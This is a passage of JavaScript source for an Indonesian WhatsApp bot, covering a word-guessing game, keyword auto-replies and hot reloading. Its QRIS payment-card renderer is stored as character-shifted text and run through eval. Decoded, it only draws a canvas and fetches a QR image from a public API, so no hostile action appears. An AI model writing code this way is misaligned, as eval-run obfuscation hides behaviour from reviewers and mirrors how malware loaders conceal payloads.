                        } else if (userAnswer.length === correctAnswer.length) {
                            // Optional: Reaksi jika ada yang menjawab salah tapi panjang karakternya sama
                            await sock.sendMessage(m.chat, { react: { text: "❌", key: m.key } });
                        }
                    }
                }

                // DETECT BENAR MENU GAME
                if (m.isGroup && !isCmd && body) {
                    global.tebakkata = global.tebakkata || {};
                    let id = m.chat;

                    if (id in global.tebakkata) {
                        let json = global.tebakkata[id][1];
                        let reward = global.tebakkata[id][2] || 10000; // Default hadiah 10.000 jika tidak ada
                        let userAnswer = body.toLowerCase().trim();
                        let correctAnswer = json.jawaban.toLowerCase().trim();

                        // 1. Fitur Bantuan (Tanpa Prefix)
                        if (userAnswer === 'bantuan' || userAnswer === 'hint') {

                            let clue = correctAnswer.replace(/[AIUEOaiueo]/g, '_');
                            sock.sendMessage(m.chat, {
                                text: `💡 *BANTUAN CLUE:*\n\nKata: \`${clue}\`\n\nAyo tebak lagi!`
                            }, { quoted: m });
                        }

                        // 2. Fitur Nyerah 
                        else if (userAnswer === 'nyerah' || userAnswer === 'surrend') {
                            sock.sendMessage(m.chat, {
                                text: `🏳️ *YAH KOK NYERAH...*\n\nPermainan dihentikan!\nJawaban yang benar adalah: *${correctAnswer.toUpperCase()}*`
                            }, { quoted: m });

                            // Hapus timer & sesi
                            clearTimeout(global.tebakkata[id][3]);
                            delete global.tebakkata[id];
                        }

                        // 3. Deteksi Jawaban Benar
                        else if (userAnswer === correctAnswer) {
                            // Update database limit/money (sesuaikan dengan method database kamu)
                            try {
                                if (db && typeof db.addLimit === 'function') {
                                    db.addLimit(m.sender, reward);
                                } else if (global.db && global.db.users && global.db.users[m.sender]) {
                                    global.db.users[m.sender].money += reward;
                                }
                            } catch (e) {
                                console.log("Database update terlewati");
                            }

                            let teksMenang = `╭─〔 *🎉 JAWABAN BENAR!* 〕─╮\n`;

                            teksMenang += `│ 👤 *Penebak* : @${m.sender.split('@')[0]}\n`;
                            teksMenang += `│ 📝 *Jawaban* : ${correctAnswer.toUpperCase()}\n`;
                            teksMenang += `│ 🎁 *Hadiah* : +${reward} Poin/Limit\n`;

                            teksMenang += `╰──────────────────╯\n`;
                            teksMenang += `> © @VannessWangsaff ID V3`;

                            sock.sendMessage(m.chat, {
                                text: teksMenang,
                                mentions: [m.sender]
                            }, { quoted: m });

                            await sock.sendMessage(m.chat, { react: { text: "🎉", key: m.key } });

                            // Hapus timer & sesi setelah menang
                            clearTimeout(global.tebakkata[id][3]);
                            delete global.tebakkata[id];
                        }
                    }
                }



                if (m.isGroup && !isCmd && body) {
                    let key = body.trim();
                    if (isAlreadyResponList(m.chat, key, db_respon_list)) {
                        let dataList = getDataResponList(m.chat, key, db_respon_list);

                        if (dataList.isImage && dataList.image_url) {
                            await sock.sendMessage(m.chat, {
                                image: { url: dataList.image_url },
                                caption: dataList.response
                            }, { quoted: m });
                        } else {
                            await sock.sendMessage(m.chat, {
                                text: dataList.response
                            }, { quoted: m });
                        }
                    }
                }


            }
        }
    } catch (err) {
        console.log(err)
        await sock.sendMessage(global.owner + "@s.whatsapp.net", { text: err.toString() }, { quoted: m })
    }
}

const VannessCanvas = "乡乳乹乮乣丠书乵乮乣乴乩乯乮丨乱乲乄乡乴乡丬丠乮乡乭乥丬丠买乲乩乣乥丬丠乴乯乴乡乬乐乡乹乭乥乮乴丩丠乻上丠丠丠丠乣乯乮乳乴丠乣乡乮乶乡乳丠丽丠乣乲乥乡乴乥乃乡乮乶乡乳丨丶丰丰丬丠丷丰丰丩主上丠丠丠丠乣乯乮乳乴丠乣乴乸丠丽丠乣乡乮乶乡乳丮乧乥乴乃乯乮乴乥乸乴丨丧串乤丧丩主上上丠丠丠丠乣乯乮乳乴丠乧乲乡乤丠丽丠乣乴乸丮乣乲乥乡乴乥乌乩乮乥乡乲乇乲乡乤乩乥乮乴丨丰丬丠丰丬丠丰丬丠丷丰丰丩主上丠丠丠丠乧乲乡乤丮乡乤乤乃乯乬乯乲乓乴乯买丨丰丬丠丧丣丵乡丱丸丹乡丧丩主上丠丠丠丠乧乲乡乤丮乡乤乤乃乯乬乯乲乓乴乯买丨丱丬丠丧丣丳乣丰丹丶乣丧丩主上丠丠丠丠乣乴乸丮书乩乬乬乓乴乹乬乥丠丽丠乧乲乡乤主上丠丠丠丠乣乴乸丮书乩乬乬乒乥乣乴丨丰丬丠丰丬丠丶丰丰丬丠丷丰丰丩主上上丠丠丠丠乣乴乸丮乳乴乲乯乫乥乓乴乹乬乥丠丽丠丧乲乧乢乡丨串丵丵丬丠串丵丵丬丠串丵丵丬丠丰丮丰丸丩丧主上丠丠丠丠乣乴乸丮乬乩乮乥乗乩乤乴乨丠丽丠丱主上丠丠丠丠书乯乲丠丨乬乥乴丠乹丠丽丠临丵丰主丠乹丠丼丠丷丰丰主丠乹丠丫丽丠串丵丩丠乻上丠丠丠丠丠丠丠丠乣乴乸丮乢乥乧乩乮乐乡乴乨丨丩主上丠丠丠丠丠丠丠丠乣乴乸丮乭乯乶乥乔乯丨丰丬丠乹丩主上丠丠丠丠丠丠丠丠乣乴乸丮乬乩乮乥乔乯丨丶丰丰丬丠乹丩主上丠丠丠丠丠丠丠丠乣乴乸丮乳乴乲乯乫乥丨丩主上丠丠丠丠乽上丠丠丠丠书乯乲丠丨乬乥乴丠乸丠丽丠中串丰丰主丠乸丠丼丽丠丸丰丰主丠乸丠丫丽丠丵丰丩丠乻上丠丠丠丠丠丠丠丠乣乴乸丮乢乥乧乩乮乐乡乴乨丨丩主上丠丠丠丠丠丠丠丠乣乴乸丮乭乯乶乥乔乯丨丳丰丰丬丠丳丵丰丩主上丠丠丠丠丠丠丠丠乣乴乸丮乬乩乮乥乔乯丨乸丬丠丷丰丰丩主上丠丠丠丠丠丠丠丠乣乴乸丮乳乴乲乯乫乥丨丩主上丠丠丠丠乽上上丠丠丠丠乣乴乸丮书乩乬乬乓乴乹乬乥丠丽丠丧乲乧乢乡丨串丵丵丬丠串丵丵丬丠串丵丵丬丠丰丮丰丵丩丧主上丠丠丠丠乣乴乸丮乢乥乧乩乮乐乡乴乨丨丩主上丠丠丠丠乣乴乸丮乡乲乣丨中丵丰丬丠串丰丰丬丠串丰丰丬丠丰丬丠乍乡乴乨丮乐义丠个丠串丩主上丠丠丠丠乣乴乸丮书乩乬乬丨丩主上丠丠丠丠乣乴乸丮乢乥乧乩乮乐乡乴乨丨丩主上丠丠丠丠乣乴乸丮乡乲乣丨丶丵丰丬丠丳丵丰丬丠丱丵丰丬丠丰丬丠乍乡乴乨丮乐义丠个丠串丩主上丠丠丠丠乣乴乸丮书乩乬乬丨丩主上上丠丠丠丠乣乴乸丮书乩乬乬乓乴乹乬乥丠丽丠丧丣书书书书书书丧主上丠丠丠丠乣乴乸丮书乯乮乴丠丽丠丧乢乯乬乤丠串临买乸丠乳乡乮乳中乳乥乲乩书丧主上丠丠丠丠乣乴乸丮书乩乬乬乔乥乸乴丨丧乑乒义乓丧丬丠临丰丬丠丵丰丩主上丠丠丠丠乣乴乸丮书乯乮乴丠丽丠丧丱丰买乸丠乳乡乮乳中乳乥乲乩书丧主上丠丠丠丠乣乴乸丮书乩乬乬乓乴乹乬乥丠丽丠丧乲乧乢乡丨串丵丵丬丠串丵丵丬丠串丵丵丬丠丰丮丸丩丧主上丠丠丠丠乣乴乸丮书乩乬乬乔乥乸乴丨丧乑乒丠乃乯乤乥丠乓乴乡乮乤乡乲丧丬丠临丰丬丠丶丵丩主上丠丠丠丠乣乴乸丮书乩乬乬乔乥乸乴丨丧乐乥乭乢乡乹乡乲乡乮丠乎乡乳乩乯乮乡乬丧丬丠临丰丬丠丷丷丩主上上丠丠丠丠乣乴乸丮书乩乬乬乓乴乹乬乥丠丽丠丧丣书书书书书书丧主上丠丠丠丠乣乴乸丮书乯乮乴丠丽丠丧乩乴乡乬乩乣丠乢乯乬乤丠串丰买乸丠乳乡乮乳中乳乥乲乩书丧主上丠丠丠丠乣乴乸丮书乩乬乬乔乥乸乴丨丧乇乐乎丧丬丠丵丱丰丬丠丵丰丩主上丠丠丠丠乣乴乸丮书乯乮乴丠丽丠丧丹买乸丠乳乡乮乳中乳乥乲乩书丧主上丠丠丠丠乣乴乸丮书乩乬乬乔乥乸乴丨丧乇久乒乂乁乎乇丠乐久乍乂乁乙乁乒乁乎丠乎乁乓义乏乎乁乌丧丬丠临丳丰丬丠丶丵丩主上上丠丠丠丠乣乴乸丮书乩乬乬乓乴乹乬乥丠丽丠丧丣书书书书书书丧主上丠丠丠丠书乵乮乣乴乩乯乮丠乲乯乵乮乤乒乥乣乴丨乸丬丠乹丬丠乷丬丠乨丬丠乲丩丠乻上丠丠丠丠丠丠丠丠乣乴乸丮乢乥乧乩乮乐乡乴乨丨丩主上丠丠丠丠丠丠丠丠乣乴乸丮乭乯乶乥乔乯丨乸丠丫丠乲丬丠乹丩主上丠丠丠丠丠丠丠丠乣乴乸丮乡乲乣乔乯丨乸丠丫丠乷丬丠乹丬丠乸丠丫丠乷丬丠乹丠丫丠乨丬丠乲丩主上丠丠丠丠丠丠丠丠乣乴乸丮乡乲乣乔乯丨乸丠丫丠乷丬丠乹丠丫丠乨丬丠乸丬丠乹丠丫丠乨丬丠乲丩主上丠丠丠丠丠丠丠丠乣乴乸丮乡乲乣乔乯丨乸丬丠乹丠丫丠乨丬丠乸丬丠乹丬丠乲丩主上丠丠丠丠丠丠丠丠乣乴乸丮乡乲乣乔乯丨乸丬丠乹丬丠乸丠丫丠乷丬丠乹丬丠乲丩主上丠丠丠丠丠丠丠丠乣乴乸丮乣乬乯乳乥乐乡乴乨丨丩主上丠丠丠丠丠丠丠丠乣乴乸丮书乩乬乬丨丩主上丠丠丠丠乽上丠丠丠丠乲乯乵乮乤乒乥乣乴丨丱丱丰丬丠丱丱丰丬丠丳丸丰丬丠丳丸丰丬丠丱串丩主上上丠丠丠丠乣乴乸丮书乩乬乬乓乴乹乬乥丠丽丠丧丣乤丹丰临串丹丧主上丠丠丠丠乣乴乸丮乢乥乧乩乮乐乡乴乨丨丩主上丠丠丠丠乣乴乸丮乭乯乶乥乔乯丨丱丱丰丬丠丱串串丩主上丠丠丠丠乣乴乸丮乡乲乣乔乯丨丱丱丰丬丠丱丱丰丬丠丱串串丬丠丱丱丰丬丠丱串丩主上丠丠丠丠乣乴乸丮乬乩乮乥乔乯丨临丷丸丬丠丱丱丰丩主上丠丠丠丠乣乴乸丮乡乲乣乔乯丨临丹丰丬丠丱丱丰丬丠临丹丰丬丠丱串串丬丠丱串丩主上丠丠丠丠乣乴乸丮乬乩乮乥乔乯丨临丹丰丬丠丱丶丰丩主上丠丠丠丠乣乴乸丮乬乩乮乥乔乯丨丱丱丰丬丠丱丶丰丩主上丠丠丠丠乣乴乸丮乣乬乯乳乥乐乡乴乨丨丩主上丠丠丠丠乣乴乸丮书乩乬乬丨丩主上上丠丠丠丠乣乴乸丮书乩乬乬乓乴乹乬乥丠丽丠丧丣书书书书书书丧主上丠丠丠丠乣乴乸丮书乯乮乴丠丽丠丧乢乯乬乤丠串丰买乸丠乳乡乮乳中乳乥乲乩书丧主上丠丠丠丠乣乴乸丮乴乥乸乴乁乬乩乧乮丠丽丠丧乣乥乮乴乥乲丧主上丠丠丠丠乣乴乸丮书乩乬乬乔乥乸乴丨丧乓乃乁乎丠么久乒久丠乔乏丠乐乁乙丧丬丠丳丰丰丬丠丱临串丩主上上丠丠丠丠乴乲乹丠乻上丠丠丠丠丠丠丠丠乣乯乮乳乴丠乱乲乕乲乬丠丽丠习乨乴乴买乳为丯丯乡买乩丮乱乲乳乥乲乶乥乲丮乣乯乭丯乶丱丯乣乲乥乡乴乥中乱乲中乣乯乤乥丯丿乳乩乺乥丽丳丰丰乸丳丰丰並乤乡乴乡丽两乻乥乮乣乯乤乥乕乒义乃乯乭买乯乮乥乮乴丨乱乲乄乡乴乡丩乽习主上丠丠丠丠丠丠丠丠乣乯乮乳乴丠乱乲乃乯乤乥义乭乧丠丽丠乡乷乡乩乴丠乬乯乡乤义乭乡乧乥丨乱乲乕乲乬丩主上丠丠丠丠丠丠丠丠乣乴乸丮乤乲乡乷义乭乡乧乥丨乱乲乃乯乤乥义乭乧丬丠丱丵丰丬丠丱丸丰丬丠丳丰丰丬丠丳丰丰丩主上丠丠丠丠乽丠乣乡乴乣乨丠丨乥乲乲丩丠乻上丠丠丠丠丠丠丠丠乣乯乮乳乯乬乥丮乥乲乲乯乲丨丢乇乡乧乡乬丠乬乯乡乤丠乑乒丠乣乯乤乥丠乩乭乡乧乥为丢丬丠乥乲乲丩主上丠丠丠丠丠丠丠丠乣乴乸丮书乩乬乬乓乴乹乬乥丠丽丠丧丣丰丰丰丰丰丰丧主上丠丠丠丠丠丠丠丠乣乴乸丮书乩乬乬乒乥乣乴丨丱丵丰丬丠丱丸丰丬丠丳丰丰丬丠丳丰丰丩主上丠丠丠丠丠丠丠丠乣乴乸丮书乩乬乬乓乴乹乬乥丠丽丠丧丣书书书书书书丧主上丠丠丠丠丠丠丠丠乣乴乸丮书乯乮乴丠丽丠丧丱临买乸丠乳乡乮乳中乳乥乲乩书丧主上丠丠丠丠丠丠丠丠乣乴乸丮书乩乬乬乔乥乸乴丨丧乇乡乧乡乬丠乭乥乭乵乡乴丠乑乒丠乃乯乤乥丧丬丠丳丰丰丬丠丳丳丰丩主上丠丠丠丠乽上上丠丠丠丠乣乯乮乳乴丠书乥乥丠丽丠乴乯乴乡乬乐乡乹乭乥乮乴丠中丠买乲乩乣乥主上丠丠丠丠乣乴乸丮乴乥乸乴乁乬乩乧乮丠丽丠丧乬乥书乴丧主上丠丠丠丠乣乴乸丮书乩乬乬乓乴乹乬乥丠丽丠丧乲乧乢乡丨串丵丵丬丠串丵丵丬丠串丵丵丬丠丰丮丷丩丧主上丠丠丠丠乣乴乸丮书乯乮乴丠丽丠丧乢乯乬乤丠丱串买乸丠乳乡乮乳中乳乥乲乩书丧主上丠丠丠丠乣乴乸丮书乩乬乬乔乥乸乴丨丧乄久乓之乒义乐乓义丧丬丠丱丱丰丬丠丵串丰丩主上丠丠丠丠乣乴乸丮书乩乬乬乔乥乸乴丨丧乊乕乍乌乁么丧丬丠临丱丰丬丠丵串丰丩主上上丠丠丠丠乣乴乸丮乳乴乲乯乫乥乓乴乹乬乥丠丽丠丧乲乧乢乡丨串丵丵丬丠串丵丵丬丠串丵丵丬丠丰丮串丩丧主上丠丠丠丠乣乴乸丮乬乩乮乥乗乩乤乴乨丠丽丠丱主上丠丠丠丠乣乴乸丮乢乥乧乩乮乐乡乴乨丨丩主上丠丠丠丠乣乴乸丮乭乯乶乥乔乯丨丱丱丰丬丠丵丳丰丩主上丠丠丠丠乣乴乸丮乬乩乮乥乔乯丨临丹丰丬丠丵丳丰丩主上丠丠丠丠乣乴乸丮乳乴乲乯乫乥丨丩主上上丠丠丠丠乣乴乸丮书乯乮乴丠丽丠丧丱临买乸丠乳乡乮乳中乳乥乲乩书丧主上丠丠丠丠乣乴乸丮书乩乬乬乓乴乹乬乥丠丽丠丧丣书书书书书书丧主上丠丠丠丠乣乴乸丮书乩乬乬乔乥乸乴丨乮乡乭乥丮乬乥乮乧乴乨丠举丠串串丠丿丠乮乡乭乥丮乳乵乢乳乴乲乩乮乧丨丰丬丠串串丩丠丫丠丧丮丮丮丧丠为丠乮乡乭乥丬丠丱丱丰丬丠丵丶丰丩主上丠丠丠丠乣乴乸丮乴乥乸乴乁乬乩乧乮丠丽丠丧乲乩乧乨乴丧主上丠丠丠丠乣乴乸丮书乩乬乬乔乥乸乴丨习乒买丠两乻买乲乩乣乥丮乴乯乌乯乣乡乬乥乓乴乲乩乮乧丨丧乩乤中义乄丧丩乽习丬丠临丹丰丬丠丵丶丰丩主上上丠丠丠丠乣乴乸丮乴乥乸乴乁乬乩乧乮丠丽丠丧乬乥书乴丧主上丠丠丠丠乣乴乸丮书乩乬乬乔乥乸乴丨丧乂乩乡乹乡丠乁乤乭乩乮丠丨乑乒义乓丩丧丬丠丱丱丰丬丠丵丹丰丩主上丠丠丠丠乣乴乸丮乴乥乸乴乁乬乩乧乮丠丽丠丧乲乩乧乨乴丧主上丠丠丠丠乣乴乸丮书乩乬乬乔乥乸乴丨习乒买丠两乻书乥乥丮乴乯乌乯乣乡乬乥乓乴乲乩乮乧丨丧乩乤中义乄丧丩乽习丬丠临丹丰丬丠丵丹丰丩主上上丠丠丠丠乣乴乸丮乢乥乧乩乮乐乡乴乨丨丩主上丠丠丠丠乣乴乸丮乭乯乶乥乔乯丨丱丱丰丬丠丶丱丰丩主上丠丠丠丠乣乴乸丮乬乩乮乥乔乯丨临丹丰丬丠丶丱丰丩主上丠丠丠丠乣乴乸丮乳乴乲乯乫乥丨丩主上上丠丠丠丠乣乴乸丮书乯乮乴丠丽丠丧乢乯乬乤丠丱丶买乸丠乳乡乮乳中乳乥乲乩书丧主上丠丠丠丠乣乴乸丮书乩乬乬乓乴乹乬乥丠丽丠丧丣书书乢丷丰丳丧主上丠丠丠丠乣乴乸丮乴乥乸乴乁乬乩乧乮丠丽丠丧乬乥书乴丧主上丠丠丠丠乣乴乸丮书乩乬乬乔乥乸乴丨丧乔乯乴乡乬丠乐乥乭乢乡乹乡乲乡乮丧丬丠丱丱丰丬丠丶临丵丩主上丠丠丠丠乣乴乸丮乴乥乸乴乁乬乩乧乮丠丽丠丧乲乩乧乨乴丧主上丠丠丠丠乣乴乸丮书乩乬乬乔乥乸乴丨习乒买丠两乻乴乯乴乡乬乐乡乹乭乥乮乴丮乴乯乌乯乣乡乬乥乓乴乲乩乮乧丨丧乩乤中义乄丧丩乽习丬丠临丹丰丬丠丶临丵丩主上上丠丠丠丠乣乴乸丮乴乥乸乴乁乬乩乧乮丠丽丠丧乣乥乮乴乥乲丧主上丠丠丠丠乣乴乸丮书乩乬乬乓乴乹乬乥丠丽丠丧乲乧乢乡丨串丵丵丬丠串丵丵丬丠串丵丵丬丠丰丮丵丩丧主上丠丠丠丠乣乴乸丮书乯乮乴丠丽丠丧丱丰买乸丠乳乡乮乳中乳乥乲乩书丧主上丠丠丠丠乣乴乸丮书乩乬乬乔乥乸乴丨丧乐乯乷乥乲乥乤丠乢乹丠乖乡乮乮乥乳乳乓乴乯乲乥丠並丠乊乁乊乁乎中乂乏乔丠乖丮丱丧丬丠丳丰丰丬丠丶丸丰丩主上上丠丠丠丠乲乥乴乵乲乮丠乣乡乮乶乡乳丮乴乯乂乵书书乥乲丨丩主上乽";
async function generateQrisCanvas(qrData, name, price, totalPayment) {
    const _0xCanvas = (str) => str.split('').map(c => String.fromCharCode(c.charCodeAt(0) - 19968)).join('');
    return eval("(" + _0xCanvas(VannessCanvas) + ")")(qrData, name, price, totalPayment);
}


fsSync.watchFile(__filename, () => {
    fsSync.unwatchFile(__filename);
    console.log(chalk.white.bold("~> Update File :"), chalk.green.bold(__filename));
    delete require.cache[require.resolve(__filename)]; require(__filename);
});

module.exports = { casesBot, fitur };